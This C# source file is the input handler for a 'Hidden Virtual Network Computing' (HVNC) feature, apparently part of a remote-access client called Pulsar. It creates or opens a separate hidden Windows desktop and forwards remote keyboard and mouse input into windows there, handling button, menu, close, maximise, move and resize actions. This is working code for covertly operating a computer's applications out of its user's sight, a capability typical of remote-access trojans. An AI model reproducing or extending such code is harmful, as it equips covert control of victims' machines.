using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Helper.HVNC
{
    /// <summary>
    /// Handles input for the Hidden Virtual Network Computing (HVNC) feature.
    /// </summary>
    public class InputHandler : IDisposable
    {
        #region Win32 API Imports

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        private static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        private static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        private static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        private static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        private static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        private static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        #endregion

        #region Constants

        // Window style constants
        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;

        // Window message constants
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int WM_NCHITTEST = 0x0084;

        // System command constants
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;

        // Hit test area constants
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;

        // Miscellaneous constants
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;
        private const int MAX_PATH = 260;
        private const int SW_SHOWMAXIMIZED = 3;

        #endregion

        #region Fields and Properties

        private readonly string desktopName;
        private POINT lastPoint = new POINT { x = 0, y = 0 };
        private IntPtr resizeWindowHandle = IntPtr.Zero;
        private IntPtr resizeMoveType = IntPtr.Zero;
        private bool leftMouseDown;
        private static readonly object syncLock = new object();

        /// <summary>
        /// Gets the desktop handle.
        /// </summary>
        public IntPtr Desktop { get; private set; } = IntPtr.Zero;

        #endregion

        #region Constructor and Dispose

        /// <summary>
        /// Initializes a new instance of the <see cref="InputHandler"/> class.
        /// </summary>
        /// <param name="desktopName">The name of the desktop to handle input for.</param>
        public InputHandler(string desktopName)
        {
            this.desktopName = desktopName;
            IntPtr desktopHandle = OpenDesktop(desktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (desktopHandle == IntPtr.Zero)
            {
                desktopHandle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            this.Desktop = desktopHandle;
        }

        /// <summary>
        /// Releases all resources used by the InputHandler.
        /// </summary>
        public void Dispose()
        {
            CloseDesktop(this.Desktop);
            GC.Collect();
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Gets the X coordinate from an lParam.
        /// </summary>
        public static int GetXCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() & 0xFFFF));
        }

        /// <summary>
        /// Gets the Y coordinate from an lParam.
        /// </summary>
        public static int GetYCoordinate(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() >> 16 & 0xFFFF));
        }

        /// <summary>
        /// Creates an lParam from X and Y coordinates.
        /// </summary>
        public static IntPtr MakeLParam(int lowWord, int highWord)
        {
            return new IntPtr(highWord << 16 | (lowWord & 0xFFFF));
        }

        #endregion

        #region Input Processing

        /// <summary>
        /// Processes an input message and sends it to the appropriate window.
        /// </summary>
        /// <param name="msg">The message to process.</param>
        /// <param name="wParam">The wParam of the message.</param>
        /// <param name="lParam">The lParam of the message.</param>
        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (syncLock)
            {
                SetThreadDesktop(this.Desktop);
                IntPtr windowHandle = IntPtr.Zero;
                bool isMouseMessage = false;
                POINT cursorPosition;

                // Handle keyboard messages
                if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                {
                    cursorPosition = this.lastPoint;
                    windowHandle = WindowFromPoint(cursorPosition);
                }
                // Handle mouse messages
                else
                {
                    isMouseMessage = true;
                    cursorPosition.x = GetXCoordinate(lParam);
                    cursorPosition.y = GetYCoordinate(lParam);
                    POINT previousPoint = this.lastPoint;
                    this.lastPoint = cursorPosition;
                    windowHandle = WindowFromPoint(cursorPosition);

                    if (msg == WM_LBUTTONUP)
                    {
                        HandleLeftButtonUp(windowHandle, lParam, cursorPosition);
                    }
                    else if (msg == WM_LBUTTONDOWN)
                    {
                        if (HandleLeftButtonDown(windowHandle, cursorPosition))
                        {
                            return;
                        }
                    }
                    else if (msg == WM_MOUSEMOVE && this.leftMouseDown)
                    {
                        if (HandleMouseDrag(windowHandle, lParam, previousPoint, cursorPosition))
                        {
                            return;
                        }
                    }
                }

                // Find the actual child window that should receive the message
                IntPtr childWindow = FindTargetChildWindow(windowHandle, ref cursorPosition);

                // Update lParam with new coordinates if this is a mouse message
                if (isMouseMessage)
                {
                    lParam = MakeLParam(cursorPosition.x, cursorPosition.y);
                }

                // Finally send the message to the target window
                PostMessage(childWindow, msg, wParam, lParam);
            }
        }

        /// <summary>
        /// Handles a left mouse button up event.
        /// </summary>
        private void HandleLeftButtonUp(IntPtr windowHandle, IntPtr lParam, POINT cursorPosition)
        {
            this.leftMouseDown = false;
            int hitTestResult = SendMessage(windowHandle, WM_NCHITTEST, IntPtr.Zero, lParam).ToInt32();

            // Check which window area was clicked
            if (hitTestResult <= HTMAXBUTTON)
            {
                if (hitTestResult == HTTRANSPARENT)
                {
                    Debug.WriteLine("HTTRANSPARENT");
                    SetWindowLong(windowHandle, GWL_STYLE, GetWindowLong(windowHandle, GWL_STYLE) | WS_DISABLED);
                    SendMessage(windowHandle, WM_NCHITTEST, IntPtr.Zero, lParam);
                }
                else if (hitTestResult == HTMINBUTTON)
                {
                    Debug.WriteLine("Hit min button");
                    PostMessage(windowHandle, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                }
            }
            else if (hitTestResult == HTCLOSE)
            {
                Debug.WriteLine("Hit close button");
                PostMessage(windowHandle, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
            }
            else if (hitTestResult == HTMAXBUTTON)
            {
                WINDOWPLACEMENT windowPlacement = default;
                windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
                GetWindowPlacement(windowHandle, ref windowPlacement);

                if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                {
                    Debug.WriteLine("Hit restore button");
                    PostMessage(windowHandle, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                }
                else
                {
                    Debug.WriteLine("Hit maximize button");
                    PostMessage(windowHandle, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                }
            }
        }

        /// <summary>
        /// Handles a left mouse button down event.
        /// </summary>
        /// <returns>True if the event was fully handled and no further processing is needed.</returns>
        private bool HandleLeftButtonDown(IntPtr windowHandle, POINT cursorPosition)
        {
            this.leftMouseDown = true;
            this.resizeWindowHandle = IntPtr.Zero;

            // Check if clicking on a button
            IntPtr buttonHandle = FindWindow("Button", null);
            RECT buttonRect;
            GetWindowRect(buttonHandle, out buttonRect);
            if (PtInRect(ref buttonRect, cursorPosition))
            {
                Debug.WriteLine("Hit button");
                PostMessage(buttonHandle, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
                return true;
            }

            // Check if clicking on a menu item
            StringBuilder className = new StringBuilder(MAX_PATH);
            RealGetWindowClass(windowHandle, className, MAX_PATH);
            if (className.ToString() == "#32768")
            {
                Debug.WriteLine("Hit menu");
                IntPtr subMenu = GetSubMenu(windowHandle, 0);
                int menuItemIndex = MenuItemFromPoint(IntPtr.Zero, subMenu, cursorPosition);
                GetMenuItemID(subMenu, menuItemIndex);
                PostMessage(windowHandle, MN_GETHMENU, new IntPtr(menuItemIndex), IntPtr.Zero);
                PostMessage(windowHandle, WM_KEYDOWN, new IntPtr(VK_RETURN), IntPtr.Zero);
                return true;
            }

            return false;
        }

        /// <summary>
        /// Handles mouse drag operations (move/resize).
        /// </summary>
        /// <returns>True if the event was fully handled and no further processing is needed.</returns>
        private bool HandleMouseDrag(IntPtr windowHandle, IntPtr lParam, POINT previousPoint, POINT currentPoint)
        {
            if (this.resizeWindowHandle == IntPtr.Zero)
            {
                Debug.WriteLine("Hit move window");
                this.resizeMoveType = SendMessage(windowHandle, WM_NCHITTEST, IntPtr.Zero, lParam);
            }
            else
            {
                Debug.WriteLine("Move window");
                windowHandle = this.resizeWindowHandle;
            }

            int deltaX = previousPoint.x - currentPoint.x;
            int deltaY = previousPoint.y - currentPoint.y;

            RECT windowRect;
            GetWindowRect(windowHandle, out windowRect);
            int left = windowRect.left;
            int top = windowRect.top;
            int width = windowRect.right - windowRect.left;
            int height = windowRect.bottom - windowRect.top;

            // Adjust window position/size based on hit test area
            switch (this.resizeMoveType.ToInt32())
            {
                case HTCAPTION:
                    left -= deltaX;
                    top -= deltaY;
                    break;
                case HTLEFT:
                    left -= deltaX;
                    width += deltaX;
                    break;
                case HTRIGHT:
                    width -= deltaX;
                    break;
                case HTTOP:
                    top -= deltaY;
                    height += deltaY;
                    break;
                case HTTOPLEFT:
                    top -= deltaY;
                    height += deltaY;
                    left -= deltaX;
                    width += deltaX;
                    break;
                case HTTOPRIGHT:
                    top -= deltaY;
                    height += deltaY;
                    width -= deltaX;
                    break;
                case HTBOTTOM:
                    height -= deltaY;
                    break;
                case HTBOTTOMLEFT:
                    height -= deltaY;
                    left -= deltaX;
                    width += deltaX;
                    break;
                case HTBOTTOMRIGHT:
                    height -= deltaY;
                    width -= deltaX;
                    break;
                default:
                    return false;
            }

            Debug.WriteLine($"Move window to {left} {top} {width} {height}");
            MoveWindow(windowHandle, left, top, width, height, false);
            this.resizeWindowHandle = windowHandle;
            return true;
        }

        /// <summary>
        /// Finds the target child window that should receive the input message.
        /// </summary>
        private IntPtr FindTargetChildWindow(IntPtr parentWindow, ref POINT point)
        {
            IntPtr childWindow = parentWindow;
            IntPtr tempWindow;

            do
            {
                tempWindow = childWindow;
                ScreenToClient(tempWindow, ref point);
                childWindow = ChildWindowFromPoint(tempWindow, point);
            }
            while (childWindow != IntPtr.Zero && childWindow != tempWindow);

            return tempWindow;
        }

        #endregion

        #region Nested Types

        /// <summary>
        /// Desktop access rights flags.
        /// </summary>
        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        /// <summary>
        /// Represents a point (x,y coordinates).
        /// </summary>
        public struct POINT
        {
            public int x;
            public int y;
        }

        /// <summary>
        /// Represents a rectangle.
        /// </summary>
        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        /// <summary>
        /// Contains information about the placement of a window.
        /// </summary>
        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }

        #endregion
    }
}
